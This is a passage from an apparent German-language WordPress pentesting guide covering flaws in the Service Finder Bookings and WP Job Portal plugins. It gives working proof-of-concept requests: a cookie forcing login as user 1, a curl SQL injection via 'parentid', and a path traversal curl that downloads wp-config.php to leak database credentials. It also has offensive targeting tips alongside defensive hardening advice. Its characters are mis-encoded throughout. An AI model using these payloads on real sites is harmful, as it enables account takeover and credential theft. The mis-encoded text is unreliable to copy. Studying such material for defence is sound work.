- Ziehe in Betracht, nur minimalen Zustand zu speichern und zeitlich begrenzte, capability-gesch√ºtzte Tokens f√ºr tempor√§re Rollenwechsel zu verwenden.

---

### Unauthenticated privilege escalation via cookie‚Äëtrusted user switching on public init (Service Finder ‚Äúsf-booking‚Äù)

Einige Plugins h√§ngen user-switching-Helfer an den √∂ffentlichen `init`-Hook und leiten die Identit√§t aus einem vom Client kontrollierten Cookie ab. Ruft der Code `wp_set_auth_cookie()` auf, ohne Authentifizierung, capability und ein g√ºltiges nonce zu √ºberpr√ºfen, kann jeder nicht authentifizierte Besucher eine Anmeldung als beliebige Benutzer-ID erzwingen.

Typisches verwundbares Muster (vereinfacht aus Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Warum es ausnutzbar ist

- √ñffentlicher `init` Hook macht den Handler f√ºr nicht authentifizierte Benutzer erreichbar (keine `is_user_logged_in()`-Pr√ºfung).
- Die Identit√§t wird aus einem vom Client modifizierbaren Cookie abgeleitet (`original_user_id`).
- Direkter Aufruf von `wp_set_auth_cookie($uid)` loggt den Anfragenden als diesen Benutzer ein, ohne Capability- oder Nonce-Pr√ºfungen.

Ausnutzung (ohne Authentifizierung)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF-√úberlegungen f√ºr WordPress/plugin CVEs

Generische Edge-/Server-WAFs sind auf breite Muster (SQLi, XSS, LFI) abgestimmt. Viele hochwirksame WordPress/plugin-Schwachstellen sind anwendungsspezifische Logik-/Authentifizierungsfehler, die wie harmloser Traffic aussehen, sofern die Engine die WordPress-Routen und die Semantik des Plugins nicht kennt.

Offensive Hinweise

- Plugin-spezifische Endpunkte mit sauberen payloads anvisieren: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Zuerst nicht-authentifizierte Pfade testen (AJAX `nopriv`, REST mit permissiver `permission_callback`, public shortcodes). Default payloads funktionieren oft ohne Obfuskation.
- Typische hochkritische F√§lle: Privilegieneskalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive Hinweise

- Verlasse dich nicht auf generische WAF-Signaturen zum Schutz vor plugin CVEs. Implementiere anwendungsschichtige, verwundbarkeitsspezifische virtuelle Patches oder aktualisiere schnell.
- Bevorzuge Positive-Security-Pr√ºfungen im Code (capabilities, nonces, strikte Eingabevalidierung) gegen√ºber negativen Regex-Filtern.

## WordPress-Schutz

### Regelm√§√üige Updates

Stelle sicher, dass WordPress, plugins und Themes auf dem neuesten Stand sind. Best√§tige au√üerdem, dass automatisches Updating in wp-config.php aktiviert ist:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Au√üerdem: **Installieren Sie nur vertrauensw√ºrdige WordPress-Plugins und -Themes**.

### Sicherheits-Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Weitere Empfehlungen**

- Entfernen Sie den Standardbenutzer **admin**
- Verwenden Sie **starke Passw√∂rter** und **2FA**
- √úberpr√ºfen Sie periodisch die **Berechtigungen** der Benutzer
- Begrenzen Sie Login-Versuche, um Brute Force attacks zu verhindern
- Benennen Sie die Datei **`wp-admin.php`** um und erlauben Sie den Zugriff nur intern oder von bestimmten IP-Adressen.


### Nicht authentifizierte SQL Injection durch unzureichende Validierung (WP Job Portal <= 2.3.2)

Das WP Job Portal recruitment plugin stellte eine **savecategory**-Aufgabe bereit, die letztendlich den folgenden verwundbaren Code in `modules/category/model.php::validateFormData()` ausf√ºhrt:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unbereinigte Benutzereingabe** ‚Äì `parentid` stammt direkt aus der HTTP-Anfrage.
2. **String-Konkatenation innerhalb der WHERE-Klausel** ‚Äì keine `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthentifizierte Zug√§nglichkeit** ‚Äì obwohl die Aktion √ºber `admin-post.php` ausgef√ºhrt wird, ist die einzige vorhandene Pr√ºfung ein **CSRF nonce** (`wp_verify_nonce()`), den jeder Besucher von einer √∂ffentlichen Seite mit dem Shortcode `[wpjobportal_my_resumes]` abrufen kann.

#### Ausnutzung

1. Einen frischen Nonce abrufen:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Beliebiges SQL injizieren, indem `parentid` missbraucht wird:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Die Antwort gibt das Ergebnis der injizierten Abfrage preis oder ver√§ndert die Datenbank und best√§tigt damit SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Eine andere Aufgabe, **downloadcustomfile**, erlaubte Besuchern, **beliebige Datei auf dem Dateisystem** mittels path traversal herunterzuladen. Der verwundbare Sink befindet sich in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ist vom Angreifer kontrolliert und wird **ohne Bereinigung** verkettet. Wieder ist das einzige Hindernis ein **CSRF nonce**, das von der resume-Seite abgerufen werden kann.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Der Server antwortet mit dem Inhalt von `wp-config.php`, leaking DB credentials und auth keys.

## Referenzen

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
